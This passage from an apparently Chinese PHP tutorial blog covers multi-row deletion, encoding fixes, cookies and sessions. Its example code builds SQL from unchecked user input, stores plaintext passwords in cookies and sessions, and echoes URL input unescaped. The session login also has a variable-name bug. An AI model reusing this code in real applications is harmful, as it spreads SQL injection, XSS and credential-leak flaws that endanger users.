<li><font color="#FF7F00"><strong>join函数将多选删除传过来的id变为了3,4,5的格式</strong></font>，最终多选删除的SQL语句执行出来的效果就是：</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">delete <span class="keyword">from</span> user where id in(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>而单选删除的语句效果就是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">delete <span class="keyword">from</span> user where id in(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>这样我们就实现了单选和多选自适应效果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from user where id in(<span class="subst">$id</span>)&quot;</span>;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>最终配套而成的整体代码演示如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;connection.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$id</span> = join(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$id</span> = (<span class="keyword">int</span>) <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;数据不合法&#x27;</span>;</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from user where id in(<span class="subst">$id</span>)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;删除成功&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;删除失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="六-通过步骤修改用户信息"><a href="#六-通过步骤修改用户信息" class="headerlink" title="六. 通过步骤修改用户信息"></a><font color="#FF6347" face="Comic sans MS">六. 通过步骤修改用户信息</font></h3><p>内容有点多，等哪天想起来了或者心情好了再写吧…..(✿◡‿◡)</p>
<p><font color="#00B2EE">[<a href="http://www.php.cn/code/1277.html">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4980.html">视频</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="七-数据显示乱码终极解决办法"><a href="#七-数据显示乱码终极解决办法" class="headerlink" title="七. 数据显示乱码终极解决办法"></a><font color="#FF6347" face="Comic sans MS">七. 数据显示乱码终极解决办法</font></h3><p>解决乱码问题的核心思想，就是：<font color="#FF7F00"><strong>一定要多个不同的文件系统中一定要统一编码</strong></font>。</p>
<p>&amp;emsp;<br>总结成了9个要点来彻底解决连接后乱码的问题。</p>
<blockquote>
<ol>
<li><font color="#00B2EE"><strong>html编码与MySQL编码一致</strong></font></li>
<li><font color="#00B2EE"><strong>PHP编码与MySQL编码一致</strong></font></li>
<li><font color="#00B2EE"><strong>若有header头发送字符集，请与数据库一样</strong></font></li>
<li><font color="#00B2EE"><strong>&lt;meta http-equiv&#x3D;“Content-Type”content&#x3D;“text&#x2F;html; charset&#x3D;utf-8” &#x2F;&gt;要和页面的文字编码一致</strong></font></li>
<li><font color="#00B2EE"><strong>数据库建库的字符集要统一</strong></font></li>
<li><font color="#00B2EE"><strong>表的字符集要统一</strong></font></li>
<li><font color="#00B2EE"><strong>列的字符集要统一(表设了,列就默认写表的)</strong></font></li>
<li><font color="#00B2EE"><strong>连接,校验的字符集要统一</strong></font></li>
<li><font color="#00B2EE"><strong>结果集的字符集要统一</strong></font></li>
</ol>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br><font color="#FF7F00"><strong>一、 文件编码</strong></font><br>html和PHP文件的编码，示例中：拿notepad++来演示。将PHP和html都要设为这种字符集。<br>一定要设置为utf-8无BOM格式。</p>
<p><img data-src="https://i.loli.net/2019/02/24/5c72764c43d27.png" alt="1"></p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>二、 header头编码</strong></font><br>如果php中有header头，一定要是<strong>utf-8</strong>的<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#FF7F00"><strong>三、网页头文件编码</strong></font><br>如果html文件编码是utf-8的也要设置为一置<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=“Content-Type”content=“text/html; charset=utf-<span class="number">8</span>” /&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#FF7F00"><strong>四、创建数据库的编码</strong></font></p>
<p><img data-src="https://i.loli.net/2019/02/24/5c72789c325a2.png" alt="2"></p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>五、表和列创建的时候表为utf-8</strong></font></p>
<p><img data-src="https://i.loli.net/2019/02/24/5c7278e24b5ad.png" alt="3.png"></p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>六、连接，结果、校验字符集设置</strong></font></p>
<blockquote>
<p><font color="#00B2EE"><strong>1.通过mysqli_set_charset(‘utf8’)来MySQL连接、结果和校验的字符集设置。<br>2.注：数据库的字符集声明和文件中的略有不同。</strong></font><font color="red"><strong>utf8为mysql数据库的，utf-8为文件中使用的。</strong></font></p>
</blockquote>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-会话管理和控制</title>
    <url>/post/PHP-SessionManagement/</url>
    <content><![CDATA[<p>(。・∀・)ノ</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 会话管理和控制</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a><font color="#FF6347" face="Comic sans MS">一. 前言</font></h3><p>标准的http协议是无状态的，无连接的。<br>？？？什么意思？⊙﹏⊙∥</p>
<blockquote>
<p><strong>【无状态】</strong></p>
</blockquote>
<ol>
<li>协议对于事务处理没有记忆能力【事物处理】【记忆能力】</li>
<li>对同一个url请求没有上下文关系【上下文关系】</li>
<li>每次的请求都是独立的，它的执行情况和结果与前面的请求和之后的请求是无直接关系的，它不会受前面的请求应答情况直接影响，也不会直接影响后面的请求应答情况【无直接联系】【受直接影响】</li>
<li>服务器中没有保存客户端的状态，客户端必须每次带上自己的状态去请求服务器【状态】</li>
</ol>
<blockquote>
<p><strong>【无连接】</strong></p>
</blockquote>
<ol>
<li>每一个访问都是无连接，服务器挨个处理访问队列里的访问，处理完一个就关闭连接，这事儿就完了，然后处理下一个新的</li>
<li>无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接</li>
</ol>
<p>&amp;emsp;<br>具体内容以及为什么使用Session和Cookie参考下面博文：<br><font color="#00B2EE">[<a href="https://www.cnblogs.com/bellkosmos/p/5237146.html">http协议无状态中的 “状态” 到底指的是什么？！</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二-Cookie概述"><a href="#二-Cookie概述" class="headerlink" title="二. Cookie概述"></a><font color="#FF6347" face="Comic sans MS">二. Cookie概述</font></h3><p>什么是Cookie？<br>请参考本站博客<font color="#00B2EE">[<a href="https://directoree.github.io/post/HTTP-User-Agen-Cookie">HTTP协议请求头部的User-Agen和Cookie</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三-PHP中的Cookie"><a href="#三-PHP中的Cookie" class="headerlink" title="三. PHP中的Cookie"></a><font color="#FF6347" face="Comic sans MS">三. PHP中的Cookie</font></h3><p><strong>这节我们通过一个用户首次登陆网站后，再次访问不需要重复输入用户名和密码的例子来学习Cookie。</strong><br><font face="Comic sans MS">php中提供了一个函数来让我们设置cookie，这个函数是：<font color="#FF7F00">bool setcookie()</font>;<br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_http_setcookie.asp">PHP setcookie() 函数</a>]</font><br>需要注意的是，这个函数每次只能设置Cookie中的一个参数，比如一次只能设置用户名、密码等字段。</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> setcookie  (</span><br><span class="line">        <span class="keyword">string</span> $名字</span><br><span class="line">        [, <span class="keyword">string</span> $值]</span><br><span class="line">        [, <span class="keyword">int</span> $过期时间  = <span class="number">0</span>]</span><br><span class="line">        [, <span class="keyword">string</span> $路径]</span><br><span class="line">        [, <span class="keyword">string</span> $域名]</span><br><span class="line">        [, <span class="keyword">bool</span> $安全  = <span class="literal">false</span>]</span><br><span class="line">        [, <span class="keyword">bool</span> <span class="variable">$http</span>只读  = <span class="literal">false</span>]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>


<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$名字</td>
<td align="left">必需。规定 cookie 的名称。</td>
</tr>
<tr>
<td align="center">$值</td>
<td align="left">可选。规定 cookie 的值。</td>
</tr>
<tr>
<td align="center">$有效期</td>
<td align="left">可选。规定 cookie 的有效期。</td>
</tr>
<tr>
<td align="center">$路径</td>
<td align="left">可选。规定 cookie 的服务器路径。</td>
</tr>
<tr>
<td align="center">$域名</td>
<td align="left">可选。规定 cookie 的域名。</td>
</tr>
<tr>
<td align="center">$安全</td>
<td align="left">可选。规定是否通过安全的 HTTPS 连接来传输 cookie。</td>
</tr>
<tr>
<td align="center">$http只读</td>
<td align="left">可选。如果true，那么js就无法读取改cookie，增加安全性。</td>
</tr>
</tbody></table>
<blockquote>
<p>1.一般来说，我们其实用不到上面那么多参数，对于这个函数，我们一般这么用：<font color="#FF7F00"><strong>setcookie(cookie名,cookie值,cookie有效期)</strong></font>;<br>2.没错，就那么3个。如此一来，我们就可以在服务端通过$_COOKIE[‘name’] 来读取cookie了。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;<br><strong>以下是示例：</strong></p>
<ol>
<li>我们将文件名命名为：cookie.php。</li>
<li>我们来模拟我们在互联网上见到最常见的例子：输入用户名和密码，登陆成功的过程。</li>
<li>我们来建一个数据库login,其中有表user,有username和password这两个字段。</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//第一次登陆的时候，通过用户输入的信息来确认用户</span></span><br><span class="line"><span class="keyword">if</span> ( ( <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="literal">null</span> ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="literal">null</span> ) ) &#123;</span><br><span class="line">    <span class="variable">$userName</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="comment">//从db获取用户信息</span></span><br><span class="line">    <span class="comment">//PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码</span></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where `username` = &#x27;<span class="subst">$userName</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$res</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="comment">//密码验证通过，设置cookies，把用户名和密码保存在客户端</span></span><br><span class="line">        setcookie(<span class="string">&#x27;username&#x27;</span>,<span class="variable">$userName</span>,time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>);<span class="comment">//设置时效一个月,一个月后这个cookie失效</span></span><br><span class="line">        setcookie(<span class="string">&#x27;password&#x27;</span>,<span class="variable">$password</span>,time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>);</span><br><span class="line">        <span class="comment">//最后跳转到登录后的欢迎页面</span></span><br><span class="line">        header(<span class="string">&#x27;Location: welcome.php&#x27;</span> . <span class="string">&quot;?username=<span class="subst">$userName</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//再次访问的时候通过cookie来识别用户</span></span><br><span class="line"><span class="keyword">if</span> ( (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="literal">null</span>)  &amp;&amp; (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="literal">null</span>) ) &#123;</span><br><span class="line">    <span class="variable">$userName</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从db获取用户信息</span></span><br><span class="line">    <span class="comment">//PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码</span></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="string">&quot;select * from user where `username` =  &#x27;<span class="subst">$userName</span>&#x27; &quot;</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$res</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="comment">//验证通过后跳转到登录后的欢迎页面</span></span><br><span class="line">        header(<span class="string">&#x27;Location: welcome.php&#x27;</span> . <span class="string">&quot;?username=<span class="subst">$userName</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">        密  码：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>跳转到的welcome.php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   welcome,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$user</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<blockquote>
<ol>
<li>这样，当我第一次访问cookie.php的时候，我需要输入用户名和密码，输入完毕后跳转到了welcome.php。然后我关闭浏览器，再次打开cookie.php，这次没有要求我输入用户信息，而是直接跳转到了welcome.php,因为之前我们存的cookie信息被浏览器自动发送到了服务端,服务端做完处理直接跳转到了welcome.php,服务器认识我们了！知道我是之前那个登陆过的用户，这样我们就通过cookie技术让无状态的HTTP协议保持了状态。<br>照着这个做一遍，我相信你会用cookie了。</li>
<li>只不过！！！只不过！！！只不过！！！重要的事要说3遍，<font color="#FF7F00"><strong>我们一般是不会把用户名和密码放到cookie中的，因为这并不安全，容易泄露自己的信息，请不要把重要的信息放到cookie中</strong></font>。我们这个只是一个学习cookie的例子。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四-PHP中使用session"><a href="#四-PHP中使用session" class="headerlink" title="四. PHP中使用session"></a><font color="#FF6347" face="Comic sans MS">四. PHP中使用session</font></h3><p>什么是session以及一些使用方法?可参考博文：<br><font color="#00B2EE">[<a href="http://www.cnblogs.com/lxwphp/p/9237312.html">php中Session使用方法详解</a>]</font><br><font color="#00B2EE">[<a href="https://www.cnblogs.com/mike1314/p/6985457.html">PHP会话机制—session的基本使用</a>]</font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_sessions.asp">W3school PHP Sessions</a>]</font></p>
<p>&amp;emsp;</p>
<ol>
<li>注意：session_start()函数之前不能有任何输出,session_start() 函数必须位于 <code>&lt;html&gt;</code> 标签之前：<br><code>&lt;?php session_start(); ?&gt;</code><br><code>&lt;\html&gt;</code><br><code>&lt;body&gt;</code><br><code>&lt;/body&gt;</code><br><code>&lt;/html&gt;</code></li>
<li>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 Session以数组的形式使用，如：$_SESSION[‘session名’]</li>
<li><strong>注册一个会话变量和读取Session</strong></li>
<li><font color="#FF7F00"><strong>在PHP中使用Session变量，除了要启动之外，还要经过注册的过程</strong></font>。注册和读取Session变量，都要通过访问$_SESSION数组完成。在$_SESSION<font color="#FF7F00"><strong>关联数组</strong></font>中的键名具有和PHP中普通变量相同的命名规则。</li>
</ol>
<p>&amp;emsp;</p>
<h4 id="4-1-开启session"><a href="#4-1-开启session" class="headerlink" title="4.1 开启session"></a><font color="#3CB371" face="Comic sans MS">4.1 开启session</font></h4><p><strong>使用函数：</strong><font color="#00B2EE"><strong>bool session_start()</strong></font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_http_setcookie.asp">PHP setcookie(void) 函数</a>]</font></p>
<p>首先我们要开启session，那么第一个要学习的函数就是<br>bool session_start()了，这个函数没有参数。在php文件的开始使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="4-2-注册-添加session数据"><a href="#4-2-注册-添加session数据" class="headerlink" title="4.2 (注册)添加session数据"></a><font color="#3CB371" face="Comic sans MS">4.2 (注册)添加session数据</font></h4><p>开启会话之后，那么在接下来的处理中，我们就可以使用$_SESSION变量来存取信息了。我们要知道的是$_SESSION变量是个数组。当我们要把信息存入session的时候应该这么写：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;userName&#x27;</span>] = <span class="string">&#x27;wang&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="4-3-读取session数据"><a href="#4-3-读取session数据" class="headerlink" title="4.3 读取session数据"></a><font color="#3CB371" face="Comic sans MS">4.3 读取session数据</font></h4><p>读取很简单，就像我们使用数组一样，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$userName</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;userName&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>当然也可以 $_SESSION[‘userName’] 来用。和<font color="red"><strong>数组一样的使用</strong></font>。</p>
<p>&amp;emsp;</p>
<h4 id="4-4-销毁session数据"><a href="#4-4-销毁session数据" class="headerlink" title="4.4 销毁session数据"></a><font color="#3CB371" face="Comic sans MS">4.4 销毁session数据</font></h4><p>我们可以使用很多种方式来销毁session数据。<br><font color="#00B2EE"><strong>a) unset函数</strong></font><br>我们通过使用类似<br><font color="#00B2EE"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;XXX&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>来销毁session中的 XXX 变量。</p>
<blockquote>
<p><font color="#FF7F00"><strong>请不要！请不要！请不要unset($_SESSION),会导致后续无法使用$_SESSION这个变量！！！</strong></font></p>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>b) 空数组赋值给session变量</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$\_SESSION = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>之前我们说过$_SESSOIN变量是个数组，那么空数组赋值的话也是相当于将当前会话的$_SESSION变量中的值销毁。</p>
</blockquote>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>c) session_destory() 函数</strong></font><br><strong>这个函数会销毁当前会话中的全部数据，并结束当前会话。但是不会重置当前会话所关联的全局变量， 也不会重置会话 cookie。</strong></p>
<p><font color="#00B2EE"></font></p>
<p>&amp;emsp;</p>
<h4 id="4-5-session的扩展"><a href="#4-5-session的扩展" class="headerlink" title="4.5 session的扩展"></a><font color="#3CB371" face="Comic sans MS">4.5 session的扩展</font></h4><p>我们可以使用很多种方式来销毁session数据。<br>默认session存储在哪里?<br>&amp;emsp;<br>1.在<code>php.ini</code>配置文件中有这么一行 <code>session.save_handler = files</code>,<br>files说明了php默认的是用文件读写的方式来保存session的。那么在哪个目录呢？继续看。session.save_path &#x3D; “&#x2F;tmp”,这一行前面有个 ; ，说明是被注释的，不过即便这样，php默认的session 也是保存在这里的，<code>/tmp</code>目录。</p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五-SESSION应用实例"><a href="#五-SESSION应用实例" class="headerlink" title="五. SESSION应用实例"></a><font color="#FF6347" face="Comic sans MS">五. SESSION应用实例</font></h3><h4 id="5-1-登陆例子"><a href="#5-1-登陆例子" class="headerlink" title="5.1 登陆例子"></a><font color="#3CB371" face="Comic sans MS">5.1 登陆例子</font></h4><blockquote>
<p><strong>2个文件：</strong></p>
</blockquote>
<ol>
<li><font color="#FF7F00">login.php</font>，用于登陆界面；</li>
<li><font color="#FF7F00">welcome.php</font>，用于接收从login.php的跳转并设置session。</li>
</ol>
<p><strong>首先建立数据库信息：</strong><br>新建一个名为 login 的数据库，再建一个 user 表，表的结构有2个字段:<br>username  varchar(20)<br>password  varchar(20)</p>
<p>&amp;emsp;<br>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ( ( <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="literal">null</span> ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="literal">null</span> ) ) &#123;</span><br><span class="line">   <span class="variable">$userName</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//从db获取用户信息   数据库信息改成自己的</span></span><br><span class="line">   <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">   <span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="string">&quot;select * from user where `username` =  &#x27;<span class="subst">$username</span>&#x27; &quot;</span>);</span><br><span class="line">   <span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$res</span>);</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line">       <span class="comment">//密码验证通过，设置session，把用户名和密码保存在服务端</span></span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//最后跳转到登录后的欢迎页面 //注意：这里我们没有像cookie一样带参数过去</span></span><br><span class="line">       header(<span class="string">&#x27;Location: welcome.php&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;!-- 这里指明页面编码 --&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">       &lt;div&gt;</span><br><span class="line">           用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">           密  码：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">           &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;        </span><br><span class="line">       &lt;/div&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br>welcome.php 这里我们用的是session中的信息,而不是像cookie一样在url中带参数过来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   welcome,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$username</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="5-2-购物车例子"><a href="#5-2-购物车例子" class="headerlink" title="5.2 购物车例子"></a><font color="#3CB371" face="Comic sans MS">5.2 购物车例子</font></h4><blockquote>
<p><strong>3个文件：</strong></p>
</blockquote>
<ol>
<li><font color="#FF7F00">goodsList.php</font> 这个是商品展示页，还有功能：如果是第一次购买某物品，则在购物车中加入该商品信息和计算总价，如果再次点击购买，则已购商品数量加1，总价重新计算，查看购物车链接可以到购物车页面。</li>
<li><font color="#FF7F00">buy.php</font> 此页完成购买功能，然后再次跳转到商品列表。主要是做了在session中处理购买商品操作。</li>
<li><font color="#FF7F00">shoppingCart.php</font> 此页展示购物车中的商品、价格、总价等信息。</li>
</ol>
